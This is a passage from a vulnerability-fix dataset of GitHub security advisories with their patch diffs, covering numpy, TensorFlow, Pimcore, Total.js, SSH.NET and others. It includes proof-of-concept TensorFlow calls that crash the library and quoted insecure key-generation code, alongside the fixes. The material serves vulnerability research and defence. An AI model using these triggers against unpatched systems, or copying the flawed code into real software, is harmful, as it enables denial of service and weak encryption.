'https:\/\/github.com\/numpy\/numpy\/raw\/ae317fd9ff3e79c0eac357d723bfc29cbd625f2e\/numpy%2Fcore%2Fsrc%2Fmultiarray%2Fctors.c', 'patch': '@@ -668,6 +668,14 @@ PyArray_NewFromDescr_int(\\n     int i;\\n     npy_intp nbytes;\\n \\n+    if ((unsigned int)nd > (unsigned int)NPY_MAXDIMS) {\\n+        PyErr_Format(PyExc_ValueError,\\n+                     \"number of dimensions must be within [0, %d]\",\\n+                     NPY_MAXDIMS);\\n+        Py_DECREF(descr);\\n+        return NULL;\\n+    }\\n+\\n     if (descr->subarray) {\\n         PyObject *ret;\\n         npy_intp newdims[2*NPY_MAXDIMS];\\n@@ -687,14 +695,6 @@ PyArray_NewFromDescr_int(\\n         return ret;\\n     }\\n \\n-    if ((unsigned int)nd > (unsigned int)NPY_MAXDIMS) {\\n-        PyErr_Format(PyExc_ValueError,\\n-                     \"number of dimensions must be within [0, %d]\",\\n-                     NPY_MAXDIMS);\\n-        Py_DECREF(descr);\\n-        return NULL;\\n-    }\\n-\\n     \/* Check datatype element size *\/\\n     nbytes = descr->elsize;\\n     if (PyDataType_ISUNSIZED(descr)) {'}}","message_norm":"merge pull request #18989 from yetanothercheer\/gh-18939-potential_buffer_overflow\n\nbug: fix potential buffer overflow(#18939)","language":"en","entities":"[('#18989', 'ISSUE', ''), ('potential_buffer_overflow', 'SECWORD', ''), ('bug', 'FLAW', ''), ('fix', 'ACTION', ''), ('buffer overflow(#18939', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['numpy\/core\/src\/multiarray\/ctors.c'])","num_files":1.0},{"index":873,"vuln_id":"GHSA-6p5r-g9mq-ggh2","cwe_id":"{'CWE-824'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ff8894044dfae5568ecbf2ed514c1a37dc394f1b'}","dataset":"osv","summary":"Reference binding to nullptr in `MatrixSetDiagV*` ops ### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in all operations of type `tf.raw_ops.MatrixSetDiagV*`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.MatrixSetDiagV3(\n  input=[1,2,3],\n  diagonal=[1,1],\n  k=[],\n  align='RIGHT_LEFT')\n```\n  \nThe  [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/linalg\/matrix_diag_op.cc) has incomplete validation that the value of `k` is a valid tensor. We have check that this value is either a scalar or a vector, but there is no check for the number of elements. If this is an empty tensor, then code that accesses the first element of the tensor is wrong: \n\n```cc \n  auto& diag_index = context->input(1);\n  ...\n  lower_diag_index = diag_index.flat<int32>()(0);\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [ff8894044dfae5568ecbf2ed514c1a37dc394f1b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ff8894044dfae5568ecbf2ed514c1a37dc394f1b).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ff8894044dfae5568ecbf2ed514c1a37dc394f1b","commit_sha":"ff8894044dfae5568ecbf2ed514c1a37dc394f1b","patch":"SINGLE","chain_ord":"['ff8894044dfae5568ecbf2ed514c1a37dc394f1b']","before_first_fix_commit":"{'59077ac39cc64139f889863081bdb3d0f88d39b6'}","last_fix_commit":"ff8894044dfae5568ecbf2ed514c1a37dc394f1b","chain_ord_pos":1.0,"commit_datetime":"07\/31\/2021, 01:58:29","message":"Add one missing valdiation to `matrix_set_diag_op.cc`\n\nPiperOrigin-RevId: 387923408\nChange-Id: If6a97b9098c13879400f56c22f91555cdf0ce5d7","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/linalg\/matrix_set_diag_op.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ff8894044dfae5568ecbf2ed514c1a37dc394f1b\/tensorflow%2Fcore%2Fkernels%2Flinalg%2Fmatrix_set_diag_op.cc', 'patch': '@@ -70,6 +70,9 @@ class MatrixSetDiagOp : public OpKernel {\\n                   errors::InvalidArgument(\\n                       \"diag_index must be a scalar or vector, received shape: \",\\n                       diag_index.shape().DebugString()));\\n+      OP_REQUIRES(\\n+          context, diag_index.NumElements() > 0,\\n+          errors::InvalidArgument(\"diag_index must have at least one element\"));\\n       lower_diag_index = diag_index.flat<int32>()(0);\\n       upper_diag_index = lower_diag_index;\\n       if (TensorShapeUtils::IsVector(diag_index.shape())) {'}}","message_norm":"add one missing valdiation to `matrix_set_diag_op.cc`\n\npiperorigin-revid: 387923408\nchange-id: if6a97b9098c13879400f56c22f91555cdf0ce5d7","language":"en","entities":"[('add', 'ACTION', ''), ('387923408', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/linalg\/matrix_set_diag_op.cc'])","num_files":1.0},{"index":878,"vuln_id":"GHSA-6pqm-xvfc-w7p4","cwe_id":"{'CWE-352'}","score":6.5,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/654e871a3923e79076818a9a03533fe88222c871'}","dataset":"osv","summary":"showdoc is vulnerable to Cross-Site Request Forgery (CSRF) showdoc is vulnerable to Cross-Site Request Forgery (CSRF).","published_date":"2021-12-03","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/654e871a3923e79076818a9a03533fe88222c871","commit_sha":"654e871a3923e79076818a9a03533fe88222c871","patch":"SINGLE","chain_ord":"['654e871a3923e79076818a9a03533fe88222c871']","before_first_fix_commit":"{'a9886f26c08225e0adca75c67dfca3f7c42b87d0'}","last_fix_commit":"654e871a3923e79076818a9a03533fe88222c871","chain_ord_pos":1.0,"commit_datetime":"11\/22\/2021, 12:22:29","message":"Cookie security \/Cookie \u5b89\u5168","author":"star7th","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'server\/index.php': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/654e871a3923e79076818a9a03533fe88222c871\/server%2Findex.php', 'patch': \"@@ -8,6 +8,18 @@\\n     require '.\/vendor\/autoload.php';\\n }\\n \\n+\/\/ cookie\u5b89\u5168\uff0c\u7ed9PHPSESSID\u52a0\u4e0aStrict\\n+if (PHP_VERSION_ID >= 70300) {\\n+    session_set_cookie_params([\\n+        'samesite' => 'Strict'\\n+    ]);\\n+} else { \\n+    session_set_cookie_params(\\n+        NULL,\\n+        '\/; samesite=Strict',\\n+    );\\n+}\\n+\\n \/\/ \u5f00\u542f\u8c03\u8bd5\u6a21\u5f0f \u5efa\u8bae\u5f00\u53d1\u9636\u6bb5\u5f00\u542f \u90e8\u7f72\u9636\u6bb5\u6ce8\u91ca\u6216\u8005\u8bbe\u4e3afalse\\n define('APP_DEBUG',True);\"}}","message_norm":"cookie security \/cookie \u5b89\u5168","language":"en","entities":"[('cookie', 'SECWORD', ''), ('security', 'SECWORD', ''), ('\/cookie', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/index.php'])","num_files":1.0},{"index":883,"vuln_id":"GHSA-6qcc-whgp-pjj2","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/8ab06bfbb5a05a1b190731d9c7476ec45f5ee878'}","dataset":"osv","summary":"Cross-site Scripting in Pimcore Pimcore version 10.3.2 and prior is vulnerable to stored cross-site scripting. A patch is available and anticipated to be part of version 10.3.3.","published_date":"2022-03-05","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/8ab06bfbb5a05a1b190731d9c7476ec45f5ee878","commit_sha":"8ab06bfbb5a05a1b190731d9c7476ec45f5ee878","patch":"SINGLE","chain_ord":"['8ab06bfbb5a05a1b190731d9c7476ec45f5ee878']","before_first_fix_commit":"{'cef6fb5a9f385f77b9a1af508ecc45a147476458'}","last_fix_commit":"8ab06bfbb5a05a1b190731d9c7476ec45f5ee878","chain_ord_pos":1.0,"commit_datetime":"03\/02\/2022, 19:06:51","message":"escaping fields in SERP preview","author":"JiaJia Ji","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'bundles\/AdminBundle\/Resources\/public\/js\/pimcore\/document\/pages\/settings.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/8ab06bfbb5a05a1b190731d9c7476ec45f5ee878\/bundles%2FAdminBundle%2FResources%2Fpublic%2Fjs%2Fpimcore%2Fdocument%2Fpages%2Fsettings.js', 'patch': '@@ -79,8 +79,8 @@ pimcore.document.pages.settings = Class.create(pimcore.document.settings_abstrac\\n             var updateSerpPreview = function () {\\n \\n                 var metaPanel = this.layout.getComponent(\"metaDataPanel\");\\n-                var title = metaPanel.getComponent(\"title\").getValue();\\n-                var description = metaPanel.getComponent(\"description\").getValue();\\n+                var title = htmlspecialchars(metaPanel.getComponent(\"title\").getValue());\\n+                var description = htmlspecialchars(metaPanel.getComponent(\"description\").getValue());\\n \\n                 var truncate = function( text, n ){\\n                     if (text.length <= n) { return text; }'}}","message_norm":"escaping fields in serp preview","language":"en","entities":"[('escaping', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Resources\/public\/js\/pimcore\/document\/pages\/settings.js'])","num_files":1.0},{"index":884,"vuln_id":"GHSA-6qgm-fv6v-rfpv","cwe_id":"{'CWE-120', 'CWE-119'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ecf768cbe50cedc0a45ce1ee223146a3d3d26d23'}","dataset":"osv","summary":"Overflow\/denial of service in `tf.raw_ops.ReverseSequence` ### Impact\nThe implementation of `tf.raw_ops.ReverseSequence` allows for stack overflow and\/or `CHECK`-fail based denial of service.\n\n```python\nimport tensorflow as tf\n\ninput = tf.zeros([1, 1, 1], dtype=tf.int32)\nseq_lengths = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.ReverseSequence(\n    input=input, seq_lengths=seq_lengths, seq_dim=-2, batch_dim=0)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5b3b071975e01f0d250c928b2a8f901cd53b90a7\/tensorflow\/core\/kernels\/reverse_sequence_op.cc#L114-L118) fails to validate that `seq_dim` and `batch_dim` arguments are valid.\n  \nNegative values for `seq_dim` can result in stack overflow or `CHECK`-failure, depending on the version of Eigen code used to implement the operation. Similar behavior can be exhibited by invalid values of `batch_dim`.\n  \n### Patches\nWe have patched the issue in GitHub commit [ecf768cbe50cedc0a45ce1ee223146a3d3d26d23](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ecf768cbe50cedc0a45ce1ee223146a3d3d26d23).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ecf768cbe50cedc0a45ce1ee223146a3d3d26d23","commit_sha":"ecf768cbe50cedc0a45ce1ee223146a3d3d26d23","patch":"SINGLE","chain_ord":"['ecf768cbe50cedc0a45ce1ee223146a3d3d26d23']","before_first_fix_commit":"{'5b3b071975e01f0d250c928b2a8f901cd53b90a7'}","last_fix_commit":"ecf768cbe50cedc0a45ce1ee223146a3d3d26d23","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 19:07:57","message":"Add missing validations to reverse_sequence_op\n\nPiperOrigin-RevId: 372178683\nChange-Id: Iac97ebab5b342f1262c77a7d9bcb4267b305ce5b","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/kernels\/reverse_sequence_op.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ecf768cbe50cedc0a45ce1ee223146a3d3d26d23\/tensorflow%2Fcore%2Fkernels%2Freverse_sequence_op.cc', 'patch': '@@ -115,6 +115,10 @@ class ReverseSequenceOp : public OpKernel {\\n       : OpKernel(context) {\\n     OP_REQUIRES_OK(context, context->GetAttr(\"batch_dim\", &batch_dim_));\\n     OP_REQUIRES_OK(context, context->GetAttr(\"seq_dim\", &seq_dim_));\\n+    OP_REQUIRES(context, batch_dim_ >= 0,\\n+                errors::InvalidArgument(\"Invalid batch_dim \", batch_dim_));\\n+    OP_REQUIRES(context, seq_dim_ >= 0,\\n+                errors::InvalidArgument(\"Invalid seq_dim \", seq_dim_));\\n   }\\n \\n   void Compute(OpKernelContext* context) override {'}}","message_norm":"add missing validations to reverse_sequence_op\n\npiperorigin-revid: 372178683\nchange-id: iac97ebab5b342f1262c77a7d9bcb4267b305ce5b","language":"en","entities":"[('add', 'ACTION', ''), ('missing validations', 'SECWORD', ''), ('372178683', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/reverse_sequence_op.cc'])","num_files":1.0},{"index":898,"vuln_id":"GHSA-6rv4-4qv6-88g2","cwe_id":"{'CWE-1321'}","score":9.8,"chain":"{'https:\/\/github.com\/IonicaBizau\/set-or-get.js\/commit\/82ede5cccb2e8d13e4f62599203a4389f6d8e936'}","dataset":"osv","summary":"Prototype Pollution in set-or-get Prototype pollution vulnerability in \u2018set-or-get\u2019 version 1.0.0 through 1.2.10 allows an attacker to cause a denial of service and may lead to remote code execution.","published_date":"2021-04-12","chain_len":1,"project":"https:\/\/github.com\/IonicaBizau\/set-or-get.js","commit_href":"https:\/\/github.com\/IonicaBizau\/set-or-get.js\/commit\/82ede5cccb2e8d13e4f62599203a4389f6d8e936","commit_sha":"82ede5cccb2e8d13e4f62599203a4389f6d8e936","patch":"SINGLE","chain_ord":"['82ede5cccb2e8d13e4f62599203a4389f6d8e936']","before_first_fix_commit":"{'6a7767c49df4be3efd5e32a68a1ea1fa449cbd03'}","last_fix_commit":"82ede5cccb2e8d13e4f62599203a4389f6d8e936","chain_ord_pos":1.0,"commit_datetime":"12\/17\/2020, 17:22:45","message":"Security fix for Prototype Pollution","author":"Arjun Shibu","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'lib\/index.js': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/IonicaBizau\/set-or-get.js\/raw\/82ede5cccb2e8d13e4f62599203a4389f6d8e936\/lib%2Findex.js', 'patch': '@@ -13,6 +13,8 @@ var Deffy = require(\"deffy\");\\n  * @return {Object|Array} The field value.\\n  *\/\\n function SetOrGet(input, field, def) {\\n+    if (field == \\'__proto__\\' || field == \\'constructor\\' || field == \\'prototype\\')\\n+        throw new Error(\\'Restricted setting magical attributes\\')\\n     return input[field] = Deffy(input[field], def);\\n }'}}","message_norm":"security fix for prototype pollution","language":"en","entities":"[('security', 'SECWORD', ''), ('prototype pollution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/index.js'])","num_files":1.0},{"index":903,"vuln_id":"GHSA-6vqp-h455-42mr","cwe_id":"{'CWE-789'}","score":5.5,"chain":"{'https:\/\/github.com\/apache\/pdfbox\/commit\/8c47be1011c11dc47300faecffd8ab32fba3646f'}","dataset":"osv","summary":"Uncontrolled Memory Allocation in Apache PDFBox A carefully crafted PDF file can trigger an OutOfMemory-Exception while loading the file. This issue affects Apache PDFBox version 2.0.22 and prior 2.0.x versions.","published_date":"2021-05-13","chain_len":1,"project":"https:\/\/github.com\/apache\/pdfbox","commit_href":"https:\/\/github.com\/apache\/pdfbox\/commit\/8c47be1011c11dc47300faecffd8ab32fba3646f","commit_sha":"8c47be1011c11dc47300faecffd8ab32fba3646f","patch":"SINGLE","chain_ord":"['8c47be1011c11dc47300faecffd8ab32fba3646f']","before_first_fix_commit":"{'ef53b45f111c4e391faf1c331c4e81a21e24c0b8'}","last_fix_commit":"8c47be1011c11dc47300faecffd8ab32fba3646f","chain_ord_pos":1.0,"commit_datetime":"03\/07\/2021, 13:18:31","message":"PDFBOX-5112: SonarCube fix, throw NoSuchElementException if no more elements are available\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/pdfbox\/branches\/2.0@1887295 13f79535-47bb-0310-9956-ffa450edef68","author":"Andreas Lehmk\u00fchler","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'pdfbox\/src\/main\/java\/org\/apache\/pdfbox\/pdfparser\/PDFXrefStreamParser.java': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/pdfbox\/raw\/8c47be1011c11dc47300faecffd8ab32fba3646f\/pdfbox%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fpdfbox%2Fpdfparser%2FPDFXrefStreamParser.java', 'patch': '@@ -19,6 +19,7 @@\\n import java.io.IOException;\\n import java.util.Arrays;\\n import java.util.Iterator;\\n+import java.util.NoSuchElementException;\\n \\n import org.apache.pdfbox.cos.COSArray;\\n import org.apache.pdfbox.cos.COSBase;\\n@@ -212,6 +213,10 @@ public boolean hasNext()\\n         @Override\\n         public Long next()\\n         {\\n+            if (currentNumber >= maxValue)\\n+            {\\n+                throw new NoSuchElementException();\\n+            }\\n             if (currentNumber < currentEnd)\\n             {\\n                 return currentNumber++;'}}","message_norm":"pdfbox-5112: sonarcube fix, throw nosuchelementexception if no more elements are available\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/pdfbox\/branches\/2.0@1887295 13f79535-47bb-0310-9956-ffa450edef68","language":"en","entities":"[('sonarcube', 'DETECTION', ''), ('https:\/\/svn.apache.org\/repos\/asf\/pdfbox\/branches\/2.0@1887295', 'URL', ''), ('13f79535', 'SHA', 'generic_sha'), ('ffa450edef68', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['pdfbox\/src\/main\/java\/org\/apache\/pdfbox\/pdfparser\/PDFXrefStreamParser.java'])","num_files":1.0},{"index":920,"vuln_id":"GHSA-7257-96vg-qf6x","cwe_id":"{'CWE-74', 'CWE-94'}","score":8.5,"chain":"{'https:\/\/github.com\/Cog-Creators\/Red-DiscordBot\/pull\/4183\/commits\/e269ea0d3bc88417163c18431b1df38a9be92bfc'}","dataset":"osv","summary":"Remote Code Execution in Red Discord Bot ### Impact\nA RCE exploit has been discovered in the Streams module: this exploit allows Discord users with specifically crafted \"going live\" messages to inject code into the Streams module's going live message. By abusing this exploit, it's possible to perform destructive actions and\/or access sensitive information.\n\n### Patches\nThis critical exploit has been fixed on version ``3.3.12`` & ``3.4``.\n\n### Workarounds\nUnloading the Streams module with ``unload streams`` can render this exploit not accessible. We still highly recommend updating to ``3.3.12`` or ``3.4`` to completely patch this issue.\n\n### References\n* https:\/\/github.com\/Cog-Creators\/Red-DiscordBot\/pull\/4183\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Cog-Creators\/Red-DiscordBot](https:\/\/github.com\/Cog-Creators\/Red-DiscordBot)\n* Over on our [Discord server](https:\/\/discord.gg\/red)","published_date":"2020-08-21","chain_len":1,"project":"https:\/\/github.com\/Cog-Creators\/Red-DiscordBot","commit_href":"https:\/\/github.com\/Cog-Creators\/Red-DiscordBot\/pull\/4183\/commits\/e269ea0d3bc88417163c18431b1df38a9be92bfc","commit_sha":"e269ea0d3bc88417163c18431b1df38a9be92bfc","patch":"SINGLE","chain_ord":"['e269ea0d3bc88417163c18431b1df38a9be92bfc']","before_first_fix_commit":"{'9798538438ceb37c0592aa358f6f0c5784878d71'}","last_fix_commit":"e269ea0d3bc88417163c18431b1df38a9be92bfc","chain_ord_pos":1.0,"commit_datetime":"08\/11\/2020, 22:40:06","message":"Added consume all to streams.","author":"Kowlin","comments":null,"stats":"{'additions': 13, 'deletions': 9, 'total': 22}","files":"{'redbot\/cogs\/streams\/streams.py': {'additions': 13, 'deletions': 9, 'changes': 22, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Cog-Creators\/Red-DiscordBot\/raw\/e269ea0d3bc88417163c18431b1df38a9be92bfc\/redbot%2Fcogs%2Fstreams%2Fstreams.py', 'patch': '@@ -497,14 +497,13 @@ async def message(self, ctx: commands.Context):\\n \\n     @message.command(name=\"mention\")\\n     @commands.guild_only()\\n-    async def with_mention(self, ctx: commands.Context, message: str = None):\\n+    async def with_mention(self, ctx: commands.Context, *, message: str = None):\\n         \"\"\"Set stream alert message when mentions are enabled.\\n \\n         Use `{mention}` in the message to insert the selected mentions.\\n+        Use `{stream}` in the message to insert the channel or user name.\\n \\n-        Use `{stream.name}` in the message to insert the channel or user name.\\n-\\n-        For example: `[p]streamset message mention \"{mention}, {stream.name} is live!\"`\\n+        For example: `[p]streamset message mention \"{mention}, {stream} is live!\"`\\n         \"\"\"\\n         if message is not None:\\n             guild = ctx.guild\\n@@ -515,12 +514,12 @@ async def with_mention(self, ctx: commands.Context, message: str = None):\\n \\n     @message.command(name=\"nomention\")\\n     @commands.guild_only()\\n-    async def without_mention(self, ctx: commands.Context, message: str = None):\\n+    async def without_mention(self, ctx: commands.Context, *, message: str = None):\\n         \"\"\"Set stream alert message when mentions are disabled.\\n \\n-        Use `{stream.name}` in the message to insert the channel or user name.\\n+        Use `{stream}` in the message to insert the channel or user name.\\n \\n-        For example: `[p]streamset message nomention \"{stream.name} is live!\"`\\n+        For example: `[p]streamset message nomention \"{stream} is live!\"`\\n         \"\"\"\\n         if message is not None:\\n             guild = ctx.guild\\n@@ -720,7 +719,10 @@ async def check_streams(self):\\n                                 channel.guild\\n                             ).live_message_mention()\\n                             if alert_msg:\\n-                                content = alert_msg.format(mention=mention_str, stream=stream)\\n+                                content = alert_msg  # Stop bad things from happening here...\\n+                                content = content.replace(\"{stream.name}\", str(stream.name))  # Backwards compatability\\n+                                content = content.replace(\"{stream}\", str(stream.name))\\n+                                content = content.replace(\"{mention}\", mention_str)\\n                             else:\\n                                 content = _(\"{mention}, {stream} is live!\").format(\\n                                     mention=mention_str,\\n@@ -733,7 +735,9 @@ async def check_streams(self):\\n                                 channel.guild\\n                             ).live_message_nomention()\\n                             if alert_msg:\\n-                                content = alert_msg.format(stream=stream)\\n+                                content = alert_msg  # Stop bad things from happening here...\\n+                                content = content.replace(\"{stream.name}\", str(stream.name))  # Backwards compatability\\n+                                content = content.replace(\"{stream}\", str(stream.name))\\n                             else:\\n                                 content = _(\"{stream} is live!\").format(\\n                                     stream=escape('}}","message_norm":"added consume all to streams.","language":"en","entities":"[('added', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['redbot\/cogs\/streams\/streams.py'])","num_files":1.0},{"index":925,"vuln_id":"GHSA-72p5-2r6g-fm6v","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/totaljs\/cms\/commit\/75205f93009db3cf8c0b0f4f1fc8ab82d70da8ad', 'https:\/\/github.com\/totaljs\/cms\/commit\/8b9d7dada998c08d172481d9f0fc0397c4b3c78d'}","dataset":"osv","summary":"Moderate severity vulnerability that affects total.js Total.js CMS 12.0.0 has XSS related to themes\/admin\/views\/index.html (item.message) and themes\/admin\/public\/ui.js (column.format).","published_date":"2019-04-02","chain_len":2,"project":"https:\/\/github.com\/totaljs\/cms","commit_href":"https:\/\/github.com\/totaljs\/cms\/commit\/75205f93009db3cf8c0b0f4f1fc8ab82d70da8ad","commit_sha":"75205f93009db3cf8c0b0f4f1fc8ab82d70da8ad","patch":"MULTI","chain_ord":"['75205f93009db3cf8c0b0f4f1fc8ab82d70da8ad', '8b9d7dada998c08d172481d9f0fc0397c4b3c78d']","before_first_fix_commit":"{'75205f93009db3cf8c0b0f4f1fc8ab82d70da8ad'}","last_fix_commit":"8b9d7dada998c08d172481d9f0fc0397c4b3c78d","chain_ord_pos":1.0,"commit_datetime":"02\/13\/2019, 19:29:24","message":"Fixed XSS.","author":"Peter S\u030cirka","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'themes\/admin\/public\/ui.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/totaljs\/cms\/raw\/75205f93009db3cf8c0b0f4f1fc8ab82d70da8ad\/themes%2Fadmin%2Fpublic%2Fui.js', 'patch': \"@@ -559,7 +559,7 @@ COMPONENT('grid', 'filter:true;external:false;fillcount:50;filterlabel:Filtering\\n \\t\\t\\tfor (var j = 0, jl = columns.length; j < jl; j++) {\\n \\t\\t\\t\\tvar column = columns[j];\\n \\t\\t\\t\\tvar val = items[i][column.name];\\n-\\t\\t\\t\\tm.value = column.template ? column.template(items[i], column) : column.render ? column.render(val, column, items[i]) : val == null ? '' : (column.format ? val.format(column.format) : val);\\n+\\t\\t\\t\\tm.value = column.template ? column.template(items[i], column) : column.render ? column.render(val, column, items[i]) : val == null ? '' : Thelpers.encode((column.format ? val.format(column.format) : val));\\n \\t\\t\\t\\tm.index = j;\\n \\t\\t\\t\\tm.align = column.align;\\n \\t\\t\\t\\tm.background = column.background;\"}}","message_norm":"fixed xss.","language":"en","entities":"[('fixed', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['themes\/admin\/public\/ui.js'])","num_files":1.0},{"index":927,"vuln_id":"GHSA-72p8-v4hg-v45p","cwe_id":"{'CWE-330', 'CWE-338'}","score":6.5,"chain":"{'https:\/\/github.com\/sshnet\/SSH.NET\/commit\/03c6d60736b8f7b42e44d6989a53f9b644a091fb', 'https:\/\/github.com\/sshnet\/SSH.NET\/commit\/f1f273cf349532b9d41c1de51d3b83a9accedc88'}","dataset":"osv","summary":"Weak private key generation in SSH.NET During an **X25519** key exchange, the client\u2019s private is generated with [**System.Random**](https:\/\/docs.microsoft.com\/en-us\/dotnet\/api\/system.random):\n\n```cs\nvar rnd = new Random();\n_privateKey = new byte[MontgomeryCurve25519.PrivateKeySizeInBytes];\nrnd.NextBytes(_privateKey);\n```\n\nSource: [KeyExchangeECCurve25519.cs](https:\/\/github.com\/sshnet\/SSH.NET\/blob\/bc99ada7da3f05f50d9379f2644941d91d5bf05a\/src\/Renci.SshNet\/Security\/KeyExchangeECCurve25519.cs#L51)  \nSource commit: https:\/\/github.com\/sshnet\/SSH.NET\/commit\/b58a11c0da55da1f5bad46faad2e9b71b7cb35b3\n\n[**System.Random**](https:\/\/docs.microsoft.com\/en-us\/dotnet\/api\/system.random) is not a cryptographically secure random number generator, it must therefore not be used for cryptographic purposes.\n\n### Impact\nWhen establishing an SSH connection to a remote host, during the X25519 key exchange, the private key is generated with\na weak random number generator whose seed can be bruteforced. This allows an attacker able to eavesdrop the\ncommunications to decrypt them.\n\n### Workarounds\nTo ensure you're not affected by this vulnerability, you can disable support for `curve25519-sha256` and `curve25519-sha256@libssh.org` key exchange algorithms by invoking the following method before a connection is established:\n```cs\nprivate static void RemoveUnsecureKEX(BaseClient client)\n{\n    client.ConnectionInfo.KeyExchangeAlgorithms.Remove(\"curve25519-sha256\");\n    client.ConnectionInfo.KeyExchangeAlgorithms.Remove(\"curve25519-sha256@libssh.org\");\n}\n```\n\n### Thanks\n\nThis issue was initially reported by **Siemens AG, Digital Industries**, shortly followed by @yaumn-synacktiv.","published_date":"2022-06-01","chain_len":2,"project":"https:\/\/github.com\/sshnet\/SSH.NET","commit_href":"https:\/\/github.com\/sshnet\/SSH.NET\/commit\/03c6d60736b8f7b42e44d6989a53f9b644a091fb","commit_sha":"03c6d60736b8f7b42e44d6989a53f9b644a091fb","patch":"MULTI","chain_ord":"['f1f273cf349532b9d41c1de51d3b83a9accedc88', '03c6d60736b8f7b42e44d6989a53f9b644a091fb']","before_first_fix_commit":"{'cad943343b4c7ea55975a3033ef1cd0646b6b9d7'}","last_fix_commit":"03c6d60736b8f7b42e44d6989a53f9b644a091fb","chain_ord_pos":2.0,"commit_datetime":"05\/29\/2022, 14:58:07","message":"Use cryptographically secure random number generator.\nFixes CVE-2022-29245.","author":"drieseng","comments":null,"stats":"{'additions': 1, 'deletions': 3, 'total': 4}","files":"{'src\/Renci.SshNet\/Security\/KeyExchangeECCurve25519.cs': {'additions': 1, 'deletions': 3, 'changes': 4, 'status': 'modified', 'raw_url': 